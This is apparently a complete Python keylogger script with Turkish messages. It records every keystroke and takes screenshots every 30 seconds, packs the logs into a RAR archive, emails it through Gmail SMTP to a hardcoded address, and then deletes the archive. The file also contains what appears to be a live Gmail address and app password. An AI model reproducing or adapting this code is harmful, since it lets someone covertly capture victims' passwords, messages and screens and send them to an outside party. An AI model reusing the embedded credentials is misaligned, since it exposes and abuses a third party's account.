#utf8
import time
import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
from threading import Timer, Thread
from mss import mss
from pynput.keyboard import Listener
import patoolib



class IntervalTimer(Timer):
    def run(self):
        while not self.finished.wait(self.interval):
            self.function(*self.args, **self.kwargs)


class Monitor:

    def _on_press(self, k):
        with open('./logs/log.txt', 'a', encoding='utf8') as f:
            f.write('{}\t\t{}\n'.format(k, time.time()))

    def _build_logs(self):
        if not os.path.exists('./logs'):
            os.mkdir('./logs')
            os.mkdir('./logs/screenshots')
            os.mkdir('./logs/keylogs')

    def create_rar(self):
        patoolib.create_archive("logs.rar", ('./logs/log.txt','./logs/screenshots/'))

    def send_mail(self):
        sender_address = 'yesaribaris23@gmail.com'
        sender_pass = 'pntkgnhstozbzpuh'
        receiver_address = 'yesaribaris23@gmail.com'
        # Setup the MIME
        message = MIMEMultipart()
        message['From'] = sender_address
        message['To'] = receiver_address
        message['Subject'] = 'Dosyalar'


        message.attach(MIMEText("KeyLogger", 'plain'))
        attach_file_name = './logs.rar'
        attach_file = open(attach_file_name, 'r', encoding="latin-1")
        payload = MIMEBase('application', 'octate-stream')
        payload.set_payload((attach_file).read(), )
        encoders.encode_base64(payload)

        payload.add_header('Content-Decomposition', 'attachment', filename=attach_file_name)
        message.attach(payload)

        session = smtplib.SMTP('smtp.gmail.com', 587)  # use gmail with port
        session.starttls()  # enable security
        session.login(sender_address, sender_pass)  # login with mail_id and password
        text = message.as_string()
        session.sendmail(sender_address, receiver_address, text)
        session.quit()
        print('Mail Gonderildi')

    def _keylogger(self):
        with Listener(on_press=self._on_press) as listener:
            listener.join()

    def _screenshot(self):
        while True:
            time.sleep(30)
            sct = mss()
            sct.shot(output='./logs/screenshots/{}.png'.format(time.time()))

    def run(self, interval=1):
        """
        Launch the keylogger and screenshot taker in two separate threads.
        Interval is the amount of time in seconds that occurs between screenshots.
        """
        self._build_logs()
        Thread(target=self._keylogger).start()
        IntervalTimer(interval, self._screenshot).start()
        self.create_rar()


        self.send_mail()
        time.sleep(1)
        os.remove('logs.rar')
        print("Rar silindi")

if __name__ == '__main__':
    mon = Monitor()
    mon.run()
